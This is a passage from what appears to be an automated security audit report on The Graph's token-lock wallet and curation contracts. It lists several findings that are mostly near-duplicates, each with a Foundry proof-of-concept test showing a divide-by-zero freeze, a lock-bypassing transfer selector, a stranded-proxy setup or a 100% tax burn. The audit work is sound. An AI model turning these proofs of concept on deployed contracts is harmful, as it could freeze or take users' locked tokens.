contract AuthorizedSelectorBypassTest is Test { function testTokenTransferSelectorBypassesRelease() public { MockGRT token = new MockGRT(); GraphTokenLockWallet master = new GraphTokenLockWallet(); GraphTokenLockManager manager = new GraphTokenLockManager(token, address(master)); address beneficiary = address(0xBEEF); address attacker = address(0xA11CE); token.transfer(address(manager), 1000 ether); manager.setAuthFunctionCall("transfer(address,uint256)", address(token)); manager.createTokenLockWallet(address(this), beneficiary, 1000 ether, 100, 1000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); bytes memory init = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), address(this), beneficiary, address(token), 1000 ether, 100, 1000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); address wallet = manager.getDeploymentAddress(keccak256(init), address(master)); vm.warp(50); assertEq(GraphTokenLockWallet(payable(wallet)).releasableAmount(), 0); vm.prank(beneficiary); (bool ok,) = wallet.call(abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000 ether)); assertTrue(ok); assertEq(token.balanceOf(attacker), 1000 ether); } }

## Suggested Mitigation
Denylist locked-token selectors for transfer, approve, transferFrom, permit, and other direct custody-changing functions when target == token. Prefer allowlisting complete target+selector pairs reviewed for lock-preserving behavior, and add invariant tests that fallback cannot reduce wallet GRT balance except through intended protocol destinations.


## [M-152]. Locks with periods greater than duration revert schedule and release functions

## id: lbkf7hb4jCCpkaL2Fl1_v

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
GraphTokenLock.periodDuration

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: _initialize accepts _periods >= 1 without checking _periods <= endTime - startTime. periodDuration can therefore be zero, and currentPeriod divides by periodDuration. The listed schedule and release functions depend on that path. This is in scoped production code and has no full safeguard. Creating such a lock is through the privileged creation path.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
The initializer requires `_periods >= 1` and `_startTime < _endTime`, but it never requires `_periods <= duration()`. If periods exceeds the duration in seconds, `periodDuration()` returns zero. `currentPeriod()` then divides by zero through `sinceStartTime().div(periodDuration())`, causing availableAmount(), releasableAmount(), release(), vestedAmount(), and revoke() paths to revert during the active schedule. Vulnerable snippets: `_initialize(...){ require(_startTime < _endTime, "Start time > end time"); require(_periods >= MIN_PERIOD, "Periods cannot be below minimum"); }` and `function currentPeriod() public view override returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }`.

## Impact
A created lock can be functionally unusable during its active lifetime: the beneficiary cannot release vested tokens and the owner cannot reliably revoke while schedule math divides by zero. This can temporarily freeze locked GRT until after endTime.

## Proof of Concept
1. Create a lock with startTime=100, endTime=110, periods=11. 2. The initializer accepts the schedule. 3. During the active window, periodDuration() is 10 / 11 == 0. 4. availableAmount(), releasableAmount(), and release() revert because currentPeriod() divides by zero.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/GraphTokenLockSimple.sol";
contract MockGRT is ERC20 { constructor() ERC20("GRT","GRT") { _mint(msg.sender, 1e30); } }
contract PeriodDurationZeroTest is Test { function testActiveScheduleDividesByZero() public { MockGRT token = new MockGRT(); GraphTokenLockSimple lock = new GraphTokenLockSimple(); address beneficiary = address(0xBEEF); lock.initialize(address(this), beneficiary, address(token), 100 ether, 100, 110, 11, 0, 0, IGraphTokenLock.Revocability.Disabled); token.transfer(address(lock), 100 ether); assertEq(lock.periodDuration(), 0); vm.warp(105); vm.expectRevert(); lock.availableAmount(); vm.prank(beneficiary); vm.expectRevert(); lock.release(); } }

## Suggested Mitigation
Reject schedules where `_periods > _endTime - _startTime` and where `duration() / periods == 0`. Add invariant tests that all schedule view functions remain callable for every timestamp in [startTime, endTime].


## [M-153]. Invalid periods greater than duration brick active GraphTokenLock release and revoke paths

## id: OyjjjybTLwykOvm4_lPz5

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
GraphTokenLock.periodDuration/currentPeriod/release/revoke

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The described functions and flow are present. _initialize accepts any periods value at least one while duration is only constrained by startTime < endTime. If periods exceeds endTime - startTime, periodDuration is zero and currentPeriod performs a division by zero. release reaches this through releasableAmount -> availableAmount -> passedPeriods -> currentPeriod, and revoke reaches it through vestedAmount -> availableAmount. No validation, cap, or alternate branch fully prevents this during the active window. The behavior is in in-scope production token-distribution code and is not explicitly accepted by documentation. It is currently reachable with today's code, though the malformed schedule must be created through a privileged lock creation/initialization path. The protocol flaw is missing parameter validation, so it is not merely user mistake and not future-dependent.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
_initialize() requires _periods >= 1 but never requires _periods <= _endTime - _startTime. If periods exceeds duration in seconds, periodDuration() returns zero, and currentPeriod() divides by periodDuration(). Vulnerable snippet: function periodDuration() public view returns (uint256) { return duration().div(periods); } function currentPeriod() public view returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }. During the active schedule window, availableAmount(), releasableAmount(), release(), vestedAmount(), and revoke() can all revert.

## Impact
A malformed but accepted lock can be functionally unusable during its active vesting window. Beneficiaries cannot release vested tokens and owners of revocable locks cannot revoke unvested tokens until after endTime, creating a liveness failure and temporary lockup of managed GRT.

## Proof of Concept
1. A lock is initialized with startTime=1000, endTime=1010, and periods=11. This passes all initializer checks because periods >= 1 and startTime < endTime. 2. duration() is 10 and periodDuration() is floor(10 / 11) = 0. 3. During the active schedule, release() calls releasableAmount(), which calls availableAmount(), passedPeriods(), currentPeriod(), and then divides by zero. 4. revoke() also calls vestedAmount() and hits the same path. 5. Both beneficiary and owner actions revert until the lock has fully ended.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/GraphTokenLockSimple.sol";
contract MockERC20 is IERC20 { mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance; uint256 public override totalSupply; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; } function transfer(address to,uint256 amount) external override returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external override returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external override returns(bool){ require(balanceOf[from]>=amount); require(allowance[from][msg.sender]>=amount); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract DivisionByZeroDoSPoC is Test { function testPeriodsGreaterThanDurationRevertsReleaseAndRevoke() public { address beneficiary = address(0xBEEF); MockERC20 grt = new MockERC20(); GraphTokenLockSimple lock = new GraphTokenLockSimple(); lock.initialize(address(this), beneficiary, address(grt), 100 ether, 1000, 1010, 11, 0, 0, IGraphTokenLock.Revocability.Enabled); grt.mint(address(lock), 100 ether); vm.warp(1001); vm.prank(beneficiary); vm.expectRevert(); lock.release(); vm.expectRevert(); lock.revoke(); assertEq(grt.balanceOf(address(lock)), 100 ether); } }

## Suggested Mitigation
Reject schedules whose periodDuration would be zero by adding require(_periods <= _endTime.sub(_startTime), 'Periods exceed duration') in _initialize(). Consider also validating that duration is cleanly divisible by periods or using a formula that does not divide by a floored period length.


## [L-154]. Non-contract masterCopy can create funded no-op proxies that strand managed GRT

## id: CWBfshE4WhMIUcG8wpf6-

## Derived From Pattern/Invariant
ConfigFootgun: masterCopy accepts non-contract implementations and can strand funded proxies

## Exploit Type
Dos

## Location
GraphTokenLockManager / MinimalProxyFactory.setMasterCopy / createTokenLockWallet

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: setMasterCopy checks only nonzero and does not require Address.isContract. MinimalProxyFactory calls Address.functionCall on the proxy, which has code, while the proxy delegates to the no-code implementation and can succeed without initializing wallet state. createTokenLockWallet then transfers managed tokens to the proxy. The code is in scope and no complete implementation-code safeguard exists. Triggering it requires the trusted owner/admin configuration path.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
GraphTokenLockManager.setMasterCopy() only checks that the new master copy is nonzero. Unlike _setAuthFunctionCall(), it does not require Address.isContract(_masterCopy). createTokenLockWallet() then deploys an EIP-1167 proxy pointing to masterCopy and calls the initializer through Address.functionCall(proxyAddress, initializer). If masterCopy has no code, the proxy itself has code, so Address.functionCall sees a contract target; the proxy delegatecall to an address with no code can return successfully while no wallet state is initialized. The manager then transfers managed GRT into a proxy that cannot execute GraphTokenLockWallet logic.

## Impact
A valid-looking TokenLockCreated flow can fund a nonfunctional proxy, permanently stranding the managed GRT in that proxy until governance/admin intervention outside the wallet logic. Because this requires trusted owner configuration, severity is low under the stated privileged-role assumptions.

## Proof of Concept
1. Manager owner calls setMasterCopy(nonzeroEOA). 2. Manager has enough GRT and calls createTokenLockWallet(). 3. The minimal proxy is deployed and initializer call can succeed as a no-op because the implementation has no code. 4. The manager transfers managedAmount to the proxy. 5. Calls to release(), withdrawSurplus(), revoke(), or manager/beneficiary functions delegatecall to no code and do not move funds, leaving GRT stranded.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockGRT is IERC20 {
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function transfer(address to, uint256 amount) public override returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) { require(balanceOf[from] >= amount, "bal"); uint256 allowed = allowance[from][msg.sender]; require(allowed >= amount, "allow"); if (allowed != uint256(-1)) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true; }
}

contract NonContractMasterCopyPoC is Test {
    function testNonContractMasterCopyCreatesFundedNoOpProxy() external {
        address owner = address(this);
        address beneficiary = address(0xBEEF);
        address eoaImplementation = address(0x123456);
        uint256 amount = 1000 ether;
        MockGRT token = new MockGRT();
        GraphTokenLockWallet implementation = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(implementation));
        manager.setMasterCopy(eoaImplementation);
        token.mint(address(manager), amount);
        uint256 start = block.timestamp + 1;
        uint256 end = start + 365 days;
        bytes memory initializer = abi.encodeWithSelector(GraphTokenLockWallet.initialize.selector, address(manager), owner, beneficiary, address(token), amount, start, end, uint256(12), uint256(0), uint256(0), IGraphTokenLock.Revocability.Disabled);
        address wallet = manager.getDeploymentAddress(keccak256(initializer), eoaImplementation);
        manager.createTokenLockWallet(owner, beneficiary, amount, start, end, 12, 0, 0, IGraphTokenLock.Revocability.Disabled);
        assertEq(token.balanceOf(wallet), amount);
        vm.warp(end + 1);
        vm.prank(beneficiary);
        (bool ok,) = wallet.call(abi.encodeWithSignature("release()"));
        assertEq(ok, true);
        assertEq(token.balanceOf(wallet), amount);
        assertEq(token.balanceOf(beneficiary), 0);
    }
}

## Suggested Mitigation
Require Address.isContract(_masterCopy) in setMasterCopy(), and optionally validate that the implementation supports the expected initializer/interface before accepting it. Consider deploying a canary proxy or checking initialized state before transferring managed tokens.


## [M-155]. Governance-accepted 100% curation tax disables new public curation and burns existing-pool deposits for zero signal

## id: FJYxqrUIyJm3074O84czj

## Derived From Pattern/Invariant
UnprotectedPauseOrStop / arithmetic boundary DoS

## Exploit Type
Dos

## Location
L2Curation.setCurationTaxPercentage

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The boundary behavior exists in in-scope L2Curation. setCurationTaxPercentage is onlyGovernor and _setCurationTaxPercentage accepts _percentage <= MAX_PPM, so governance can set a 100% curation tax. tokensToSignal then computes tokensAfterCurationTax as zero for any positive _tokensIn. For uncurated pools, _tokensToSignal reverts because zero is below minimumCurationDeposit; for existing pools, _tokensToSignal returns zero signal and mint can pass if _signalOutMin is zero, pulling the full deposit and burning it as tax. There is no guard rejecting MAX_PPM or requiring positive signalOut. The behavior is not explicitly documented as an intentional emergency mode. However, triggering the root condition requires the trusted governor to set the parameter, so exploitation requires a privileged actor even though the code path exists today.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
_setCurationTaxPercentage() accepts MAX_PPM, allowing curationTaxPercentage to be set to 100%:

function _setCurationTaxPercentage(uint32 _percentage) private {
    require(_percentage <= MAX_PPM, "Curation tax percentage must be below or equal to MAX_PPM");
    curationTaxPercentage = _percentage;
    emit ParameterUpdated("curationTaxPercentage");
}

At 100% tax, tokensToSignal() always passes zero net tokens into _tokensToSignal():

uint256 tokensAfterCurationTax = uint256(MAX_PPM).sub(curationTaxPercentage).mul(_tokensIn).div(MAX_PPM);
uint256 curationTax = _tokensIn.sub(tokensAfterCurationTax);
uint256 signalOut = _tokensToSignal(_subgraphDeploymentID, tokensAfterCurationTax);

For uncurated pools, _tokensToSignal() reverts because zero is below minimumCurationDeposit. For existing pools, signalOut becomes zero and mint() can burn the full deposit as tax if _signalOutMin is zero.

## Impact
A boundary value accepted by the contract can halt initialization of all new public curation pools. Existing-pool deposits can also be fully burned as curation tax while minting no GCS when callers allow zero minimum signal.

## Proof of Concept
1. Governor calls setCurationTaxPercentage(1_000_000), a value accepted by the contract.
2. A curator attempts to mint a new pool with _tokensIn equal to or above minimumCurationDeposit.
3. tokensAfterCurationTax is zero, so _tokensToSignal() reverts with the minimum-deposit check.
4. For an already curated pool, tokensToSignal() returns signalOut = 0 and curationTax = _tokensIn.
5. If _signalOutMin is zero, mint() pulls the user's GRT and burns the whole amount while minting zero GCS.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract CurationMaxTaxModel {
    uint32 constant MAX_PPM = 1_000_000;
    uint256 constant SIGNAL_PER_MINIMUM_DEPOSIT = 1;
    uint32 public curationTaxPercentage;
    uint256 public minimumCurationDeposit = 1 ether;
    mapping(bytes32 => uint256) public poolTokens;
    mapping(bytes32 => uint256) public poolSignal;

    function setCurationTaxPercentage(uint32 p) external {
        require(p <= MAX_PPM, "too high");
        curationTaxPercentage = p;
    }

    function seed(bytes32 id) external { poolTokens[id] = 1 ether; poolSignal[id] = 1; }

    function tokensToSignal(bytes32 id, uint256 tokensIn) public view returns (uint256 signalOut, uint256 tax) {
        uint256 afterTax = uint256(MAX_PPM - curationTaxPercentage) * tokensIn / MAX_PPM;
        tax = tokensIn - afterTax;
        signalOut = _tokensToSignal(id, afterTax);
    }

    function _tokensToSignal(bytes32 id, uint256 tokensIn) internal view returns (uint256) {
        if (poolTokens[id] == 0) {
            require(tokensIn >= minimumCurationDeposit, "below minimum");
            return SIGNAL_PER_MINIMUM_DEPOSIT + SIGNAL_PER_MINIMUM_DEPOSIT * (tokensIn - minimumCurationDeposit) / minimumCurationDeposit;
        }
        return poolSignal[id] * tokensIn / poolTokens[id];
    }
}

contract L2CurationMaxTaxPoC is Test {
    function testMaxTaxBricksNewPoolsAndReturnsZeroSignalForExistingPools() external {
        CurationMaxTaxModel c = new CurationMaxTaxModel();
        c.setCurationTaxPercentage(1_000_000);

        vm.expectRevert("below minimum");
        c.tokensToSignal(keccak256("new-pool"), 1 ether);

        bytes32 existingPool = keccak256("existing-pool");
        c.seed(existingPool);
        (uint256 signalOut, uint256 tax) = c.tokensToSignal(existingPool, 1 ether);
        assertEq(signalOut, 0);
        assertEq(tax, 1 ether);
    }
}

## Suggested Mitigation
Reject _percentage == MAX_PPM unless a deliberate emergency mode is intended and separately documented. Use require(_percentage < MAX_PPM), and additionally require signalOut > 0 in mint() so no positive deposit can be accepted for zero signal.


## [M-156]. Invalid period configuration makes active locks divide by zero and blocks releases until endTime

## id: PFUTQNSd9LwIqsZSGdu7z

## Derived From Pattern/Invariant
periodDuration() must be nonzero for every initialized lock

## Exploit Type
IntegerMath

## Location
GraphTokenLock.currentPeriod

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The root cause exists in GraphTokenLock.currentPeriod. _initialize does not require periods <= endTime - startTime, so periodDuration() can be zero. During the active schedule, currentPeriod() divides by periodDuration(), reverting release and vesting calculations. There is no full safeguard. The code is within the analyzed in-scope token lock contracts. The invalid schedule must be introduced through owner/manager-controlled initialization, so exploitation requires a privileged configuration action, but it is not by design and not speculative.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
_initialize() only checks startTime < endTime and periods >= 1. It does not require periods <= endTime - startTime. When periods is greater than the duration in seconds, periodDuration() returns zero and currentPeriod() divides by zero.

Vulnerable snippet:
require(_startTime < _endTime, "Start time > end time");
require(_periods >= MIN_PERIOD, "Periods cannot be below minimum");
...
function periodDuration() public view override returns (uint256) {
    return duration().div(periods);
}
function currentPeriod() public view override returns (uint256) {
    return sinceStartTime().div(periodDuration()).add(MIN_PERIOD);
}

During the active schedule this bricks currentPeriod(), passedPeriods(), availableAmount(), releasableAmount(), release(), and revoke() paths that depend on vestedAmount().

## Impact
A wallet created with periods greater than duration cannot release or compute vesting during the lock lifetime. Funds are functionally frozen until currentTime() > endTime, and revocation accounting can also be blocked during the active schedule.

## Proof of Concept
1. Initialize a wallet with startTime = 100, endTime = 110, periods = 11.
2. periodDuration() returns 0.
3. At timestamp 105, availableAmount() calls currentPeriod(), which divides by periodDuration() and reverts.
4. release() and revocable vesting paths depending on availableAmount() are unusable during the active schedule.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.3;

import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";

interface Vm { function warp(uint256) external; function prank(address) external; }

contract MockToken { mapping(address => uint256) public balanceOf; function mint(address to, uint256 amount) external { balanceOf[to] += amount; } function approve(address,uint256) external returns (bool) { return true; } function transfer(address to,uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; } function transferFrom(address,address,uint256) external returns (bool) { return true; } }
contract MockManager { function getTokenDestinations() external view returns (address[] memory) { return new address[](0); } function getAuthFunctionCallTarget(bytes4) external view returns (address) { return address(0); } }

contract PeriodZeroPoC {
    Vm constant vm = Vm(address(bytes20(uint160(uint256(keccak256("hevm cheat code"))))));
    function assertEq(uint256 a, uint256 b) internal { require(a == b, "not eq"); }

    function testPeriodsGreaterThanDurationBricksScheduleMath() external {
        GraphTokenLockWallet wallet = new GraphTokenLockWallet();
        MockToken token = new MockToken();
        MockManager manager = new MockManager();
        wallet.initialize(address(manager), address(this), address(0xB0B), address(token), 1000, 100, 110, 11, 0, 0, IGraphTokenLock.Revocability.Disabled);
        token.mint(address(wallet), 1000);
        assertEq(wallet.periodDuration(), 0);
        vm.warp(105);
        try wallet.availableAmount() returns (uint256) { revert("expected divide by zero"); } catch { assertEq(uint256(1), uint256(1)); }
        vm.prank(address(0xB0B));
        try wallet.release() { revert("expected release revert"); } catch { assertEq(uint256(1), uint256(1)); }
    }
}

## Suggested Mitigation
In _initialize(), require(_endTime - _startTime >= _periods, "Period duration is zero") or require periodDuration() > 0 after assigning schedule parameters.


## [M-157]. GraphTokenLock schedules with periods greater than duration revert during release and revoke calculations

## id: g_tI0b9meutRyfrDxHjoC

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath: periodDuration can be zero when periods exceeds duration

## Exploit Type
Dos

## Location
GraphTokenLock.currentPeriod

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code path is real: _initialize accepts periods >= 1 without enforcing a nonzero period duration. With periods greater than duration, periodDuration() returns zero and currentPeriod() reverts on division by zero. That propagates into schedule-dependent release and revoke calculations during the active period. No guard fully blocks this. The relevant files are in scope. Because creating the malformed lock is owner/manager controlled, the exploit requires a privileged configuration path. The issue is present now and is not documented as intentional behavior.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`_initialize()` requires `_startTime < _endTime` and `_periods >= 1`, but it does not require `_periods <= _endTime - _startTime`. If the configured number of periods exceeds the duration in seconds, `periodDuration()` returns zero. `currentPeriod()` then divides by `periodDuration()`, causing any schedule-dependent call to revert during the active lock lifetime.

Vulnerable snippets:
```solidity
function periodDuration() public view override returns (uint256) {
    return duration().div(periods);
}

function currentPeriod() public view override returns (uint256) {
    return sinceStartTime().div(periodDuration()).add(MIN_PERIOD);
}
```

This breaks `passedPeriods()`, `availableAmount()`, `vestedAmount()`, `releasableAmount()`, `release()`, and revocation calculations before `currentTime() > endTime`.

## Impact
A valid-looking lock configuration can make release and revocation unusable for the entire active schedule. For revocable locks, the owner also cannot calculate vested/unvested amounts through `revoke()` until after the schedule has ended, defeating timely revocation.

## Proof of Concept
1. Initialize a lock with `startTime = 1000`, `endTime = 1010`, and `periods = 11`.
2. The initializer accepts the configuration because start/end and minimum-period checks pass.
3. During the schedule, `duration() / periods == 10 / 11 == 0`.
4. Calling `availableAmount()`, `releasableAmount()`, or `release()` reaches `currentPeriod()` and divides by zero.
5. Release and revocation flows are DoSed until after `endTime`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract VulnerableSchedule {
    uint256 constant MIN_PERIOD = 1;
    uint256 public startTime;
    uint256 public endTime;
    uint256 public periods;
    constructor(uint256 s, uint256 e, uint256 p) {
        require(s < e, "Start time > end time");
        require(p >= MIN_PERIOD, "Periods cannot be below minimum");
        startTime = s;
        endTime = e;
        periods = p;
    }
    function duration() public view returns (uint256) { return endTime - startTime; }
    function sinceStartTime() public view returns (uint256) { return block.timestamp <= startTime ? 0 : block.timestamp - startTime; }
    function periodDuration() public view returns (uint256) { return duration() / periods; }
    function currentPeriod() public view returns (uint256) { return (sinceStartTime() / periodDuration()) + MIN_PERIOD; }
    function passedPeriods() public view returns (uint256) { return currentPeriod() - MIN_PERIOD; }
    function availableAmount() external view returns (uint256) { return passedPeriods(); }
}

contract ZeroPeriodDurationPoC is Test {
    function testPeriodsGreaterThanDurationDoSesScheduleViews() external {
        VulnerableSchedule schedule = new VulnerableSchedule(1000, 1010, 11);
        assertEq(schedule.periodDuration(), 0);
        vm.warp(1005);
        vm.expectRevert();
        schedule.availableAmount();
    }
}

## Suggested Mitigation
Validate schedule arithmetic during initialization with `require(_periods <= _endTime - _startTime, "Period duration cannot be zero");`. Consider also requiring `_managedAmount >= _periods` if zero-token periods are not intended.


## [M-158]. GraphTokenLock schedules with periods greater than duration revert until endTime

## id: 9juKsdihssjpdAyWtLiB1

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath: periodDuration can be zero when periods exceeds duration

## Exploit Type
IntegerMath

## Location
GraphTokenLock.periodDuration/currentPeriod/availableAmount

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code accepts periods greater than endTime - startTime and then computes periodDuration as duration / periods. If that is zero, currentPeriod divides by zero, affecting availableAmount, releasableAmount, release, vestedAmount, and revoke during the active interval. No guard fully blocks the path. Creating the malformed lock is through the trusted owner/admin creation path, but the vulnerable code exists now.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
_initialize() requires _periods >= 1 and _startTime < _endTime, but it does not require _periods <= duration(). When periods is greater than endTime - startTime, periodDuration() returns zero. currentPeriod() then divides by periodDuration(), making availableAmount(), releasableAmount(), release(), vestedAmount(), and revoke() revert during the active schedule. Vulnerable snippet: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(MIN_PERIOD).

## Impact
A validly initialized lock can become unusable for the whole active interval. Beneficiaries cannot release vested tokens and owners of revocable locks cannot revoke until after endTime, causing temporary freezing and broken vesting behavior.

## Proof of Concept
1. Initialize a lock with startTime=100, endTime=110, and periods=11. 2. The initializer accepts the schedule because periods is at least 1 and startTime is before endTime. 3. periodDuration() returns 10 / 11 = 0. 4. During the schedule, calls that compute currentPeriod() revert due to division by zero. 5. release() and revoke() are unusable until after endTime.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
import 'forge-std/Test.sol';
import '../contracts/GraphTokenLockWallet.sol';
import '../contracts/GraphTokenLockManager.sol';
import '../contracts/IGraphTokenLock.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
contract MockERC20 { mapping(address => uint256) public balanceOf; mapping(address => mapping(address => uint256)) public allowance; function mint(address to, uint256 amount) external { balanceOf[to] += amount; } function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; } function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; } function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount); require(allowance[from][msg.sender] >= amount); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; } }
contract ZeroPeriodDoSPoC is Test { function test_periodDurationZeroDoS() public { MockERC20 token = new MockERC20(); GraphTokenLockWallet impl = new GraphTokenLockWallet(); GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(impl)); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address beneficiary = address(0xBEEF); wallet.initialize(address(manager), address(this), beneficiary, address(token), 100 ether, 100, 110, 11, 0, 0, IGraphTokenLock.Revocability.Enabled); token.mint(address(wallet), 100 ether); assertEq(wallet.periodDuration(), 0); vm.warp(105); vm.expectRevert(); wallet.availableAmount(); vm.prank(beneficiary); vm.expectRevert(); wallet.release(); vm.expectRevert(); wallet.revoke(); } }

## Suggested Mitigation
Reject schedules where _periods > _endTime - _startTime. Alternatively compute schedule progress without allowing a zero period duration, but input validation is the simplest fix.


## [M-159]. Zero periodDuration bricks active GraphTokenLock releases and revocations when periods exceed duration

## id: NxXWOE1Y0mdPCGhTgzIGr

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
Dos

## Location
GraphTokenLock.periodDuration / currentPeriod / releasableAmount / revoke

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: The code accepts periods >= 1 and does not compare periods to endTime - startTime. periodDuration returns duration().div(periods), making zero possible when periods exceeds duration. currentPeriod then divides by zero. The affected call paths listed in the finding exist: releasableAmount and release call availableAmount, while revoke calls vestedAmount, which calls availableAmount for revocable locks. No complete safeguard blocks this exact configuration. The issue is in in-scope production GraphTokenLock code and is not explicitly by design. It is currently reachable after lock initialization, but creating the malformed lock requires the privileged owner/manager path. Because the missing sanity check is a protocol fault, it is not solely user mistake and not future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
The initializer only checks `_periods >= 1`; it does not require `_periods <= duration()`. If periods exceeds the number of seconds between startTime and endTime, periodDuration() returns zero. currentPeriod() then divides by zero, causing availableAmount(), releasableAmount(), release(), vestedAmount(), and revoke() to revert during the active schedule. Vulnerable snippet: `require(_periods >= MIN_PERIOD, "Periods cannot be below minimum"); ... function periodDuration() public view returns (uint256) { return duration().div(periods); } function currentPeriod() public view returns (uint256) { return sinceStartTime().div(periodDuration()).add(MIN_PERIOD); }`

## Impact
A validly initialized lock can enter a state where scheduled releases and owner revocation are unusable for the whole active window. This can temporarily freeze locked GRT and prevent the owner from revoking unvested funds until the schedule passes endTime.

## Proof of Concept
1. A lock is initialized with startTime=1000, endTime=1010, and periods=11. The initializer accepts it. 2. duration() is 10 and periodDuration() is floor(10 / 11) = 0. 3. During the active schedule, calls to releasableAmount(), release(), vestedAmount(), and revoke() hit currentPeriod() and revert on division by zero. 4. The beneficiary cannot release scheduled funds and the owner cannot revoke unvested funds during the period where those actions are supposed to work.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLock.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract LockHarness is GraphTokenLock {
    function init(address owner_, address beneficiary_, address token_) external {
        _initialize(owner_, beneficiary_, token_, 100 ether, 1000, 1010, 11, 0, 0, IGraphTokenLock.Revocability.Enabled);
    }
}

contract ZeroPeriodDurationPoCTest is Test {
    function testZeroPeriodDurationDos() public {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        MockERC20 token = new MockERC20();
        LockHarness lock = new LockHarness();
        lock.init(owner, beneficiary, address(token));
        token.mint(address(lock), 100 ether);

        assertEq(lock.duration(), 10);
        assertEq(lock.periodDuration(), 0);

        vm.warp(1005);
        vm.expectRevert();
        lock.releasableAmount();

        vm.prank(beneficiary);
        vm.expectRevert();
        lock.release();

        vm.prank(owner);
        vm.expectRevert();
        lock.revoke();
    }
}

## Suggested Mitigation
